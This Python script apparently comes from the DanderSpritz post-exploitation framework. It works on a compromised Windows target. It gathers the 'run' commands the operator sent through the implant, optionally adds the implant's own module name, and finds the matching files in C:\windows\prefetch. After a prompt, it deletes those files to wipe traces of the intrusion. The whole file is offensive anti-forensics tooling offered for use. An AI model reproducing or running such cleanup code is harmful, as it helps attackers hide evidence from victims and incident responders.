
import dsz
import ops.cmd
import ops.data
from ops.pprint import pprint
run_cmd = []
zb_list = []
pf_list = []
run_list = []
unique_clean_list = []
final_list = []
ZB = 0

def clean_files():
    print_list = []
    if (len(final_list) == 0):
        print 'No prefetch files found'
        return
    print ' '
    for i in final_list:
        print_list.append([('C:\\windows\\prefetch\\' + i[0][0]), i[0][1], i[1]])
    pprint(print_list, ['Path', 'Date', 'Your Command?'])
    print ''
    if (not dsz.ui.Prompt('I think that these are your prefetch files, should I delete them for you?', False)):
        print 'Leaving files in place'
    else:
        for j in final_list:
            cmd_str = ('delete -file C:\\windows\\prefetch\\' + str(j[0][0]))
            dcmd = ops.cmd.getDszCommand(cmd_str)
            dcmd.execute()

def check_files():
    for bin in unique_clean_list:
        for pf_file in pf_list:
            if (pf_file[0].find(bin[0]) > (-1)):
                final_list.append([pf_file, bin[1]])

def search_pf():
    dircmd = ops.cmd.getDszCommand('dir C:\\windows\\prefetch\\')
    results = dircmd.execute()
    for i in results.diritem:
        for j in i.fileitem:
            if (j.name.upper().find('.EXE') > 0):
                tmp = j.filetimes.created.time.split('T')
                pf_list.append([j.name.lower(), tmp[0]])

def zippycheck():
    if (not dsz.ui.Prompt('Did you ZB on this target?', False)):
        print 'No Zippy'
        search_cmds(0)
    else:
        print 'Zippy Selected'
        search_cmds(1)

def search_cmds(ZB):
    t = dsz.script.Env
    tgt = t['target_address']
    if (ZB == 1):
        proccmd = ops.cmd.quickrun('processinfo')
        lcmd = proccmd.processinfo.modules.module[0].modulename
        tp1 = lcmd.split('\\')
        zb_list.append([tp1[(len(tp1) - 1)].lower(), lcmd])
    dircmd = ops.cmd.getDszCommand('dir C:\\windows\\prefetch\\')
    dircmd.execute()
    lastId = dsz.cmd.LastId()
    for eachId in range(lastId):
        try:
            obj = ops.data.getDszObject(eachId)
            if ((obj.commandmetadata.destination == tgt) and (obj.commandmetadata.name == 'run') and (obj.commandmetadata.fullcommand.lower().find('local') < 0)):
                run_cmd.append(obj.commandmetadata.fullcommand)
                print str(obj.commandmetadata.fullcommand)
        except:
            x = 1
    tmp1 = []
    tmp2 = []
    tmp3 = []
    for item in run_cmd:
        tmp1 = item.split('-command')
        tmp1[1] = tmp1[1].lstrip()
        tmp1[1] = tmp1[1].strip('"')
        if (('.EXE' in tmp1[1]) or ('.exe' in tmp1[1])):
            tmp2 = tmp1[1].split('.exe')
            tmp3 = tmp2[0].split('\\')
            run_list.append([(tmp3[(len(tmp3) - 1)].lower() + '.exe'), item])
        else:
            tmp2 = tmp1[1].split('\\')
            run_list.append([(tmp2[(len(tmp2) - 1)].lower() + '.exe'), item])
    combined = (run_list + zb_list)
    combined.sort()
    for eachval in combined:
        if (eachval not in unique_clean_list):
            unique_clean_list.append(eachval)
zippycheck()
search_pf()
check_files()
clean_files()